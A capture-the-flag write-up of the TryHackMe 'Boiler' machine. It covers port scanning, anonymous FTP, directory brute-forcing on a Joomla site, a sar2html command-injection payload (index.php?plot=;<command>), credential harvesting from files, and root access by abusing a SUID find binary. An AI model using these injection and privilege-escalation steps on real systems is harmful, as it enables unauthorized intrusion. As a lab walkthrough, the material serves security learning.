# recon.
Like always, start with nmap. I use my own tool to automate nmap scan, check it out [pymap](https://github.com/gu2rks/pymap)
```console
$ python3 pymap.py -t $IP --all
```
there are 4 open port:
- 21/tcp    open  ftp
- 80/tcp    open  http
- 10000/tcp open  snet-sensor-mgmt
- 55007/tcp open  ssh


## port 21
from nmap scan you should note that FTP is open for Anonymous log in. (`ftp-anon: Anonymous FTP login allowed (FTP code 230)`) so let check it out:
```console
kali@kali:~/THM/boiler$ ftp $IP 
Connected to 10.10.108.17.
220 (vsFTPd 3.0.3)
Name (10.10.108.17:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (29.5565 kB/s)
```
now back to kali:
```
kali@kali:~/THM/boiler$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
from the looks of the cipher, you can already tell that it is a substitution cipher. substitution cipher works in a way that it "rotate" each character. 

Any how the message was
```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```
seem like we got trolled by the room creater... so let move on to the next port.

## Port 80
Like always start fire up ur gobuster or ur favorite web directory brute forcing tool
```console
$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
While you are waiting for the result, go explore the web (happy path). I found something in  `robots.txt`
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
you can try to decryp the cipher if you want to but I can sell you direcly that you will not get anything out of it. Seem like the `MrSeth6797` (room creator) love to troll us.


anyhow I found out that the web is hosting `/joomla` There is nothing much on the blog. only one post. so let dig more by running gobuster at `/joomla`
```console
$ gobuster dir -u http://$IP/joomla -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
here is what I found
```
/LICENSE.txt (Status: 200)
/README.txt (Status: 200)
/_a______ (Status: 301)
/_d_____ (Status: 301)
/_f___ (Status: 301)
/_t___ (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/configuration.php (Status: 200)
/htaccess.txt (Status: 200)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
/~ww__ (Status: 301)
```
This is my 3rd time working with Joomla. By looking at the results, There is some dikectory that is looks juicy.
1. /administrator: admin login page
2. /_a______ (Status: 301)
3. /_da____ (Status: 301)
4. /_f___ (Status: 301)
5. /_t__ (Status: 301)
6. /~ww__ (Status: 301)


number 2-6 are directories that not included in joomla by defualt which is worth checking.

Since im already done with this room, I can tell you direcly that some of them are just a rabbit hole, `MrSeth6797` just messing with us.

anyhow you will find the "rigth" one on the list above? how do I know that?
1. There is something that it is not there by defualt
2. I found an exploit after I google about it


So the site run `sar2html`. In short, Sar2html is web based frontend for performance monitoring. It converts sar binary data to graphical format and keep historical data in it's library. if you search 

if you search for `sar2html exploit` you will find a RCE exploit which we can use to for farther attack. you can find the exploit [here](https://www.exploit-db.com/exploits/47204)

```
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```
so the plan is us this to enumerate the server and hope that we might find some juicy info such as, usernames/password.

so I started with checking for users by checking if it work by execute `whoami`. **BOOM** ! it works !! then I execute `/index.php?plot=;ls ../../../../../home/` the figure below show the result.

![whoami](../pic/Screenshot%202020-08-07%20at%2019.42.36.png)


![users](../pic/Screenshot%202020-08-07%20at%2019.43.14.png)

I found a juicy at `www-data` home directory which contain **Basterd's password**. **Hint**:
<details>log.txt</details>

## foot hold
now ssh to the victim server using Basterd credential. dont forget that ssh is on port 5507. here is what you will find on Basterd home directory
```
$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
```
You should already tell that `backup.sh` is juicy!!
1. stoner is the owner of the files.
2. the name of the file
3. it is a shell/bash script

Examine `backup.sh`, You will find Stoner's password. Back to kali, ssh to the victim server again but using Stoner's credential this time.
```console
stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 4 stoner stoner 4096 Aug  7 21:12 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 Aug  7 21:12 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
```
now grep the user flag (.secret)

# root
You can start with `sudo -l` if you wanna but I can tell you direcly it is just another rabbit whole. `MrSeth6797` he did it again...

The next step is looking for `SUID`, if you dont know what `SUID` is, pls do some research by youself. Anyway, I use suid3num.py to enumerate `SUID`. You can find the tool on github [link](https://github.com/Anon-Exploiter/SUID3NUM). Tranfer the script to victim server and run it
```
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/find -~> https://gtfobins.github.io/gtfobins/find
------------------------------
```
**MashaAllah**, let use it to get root flag!!
```console
stoner@Vulnerable:~$ find *.py -exec whoami \;
root
stoner@Vulnerable:~$ find *.py -exec ls /root/ \;
root.txt
```
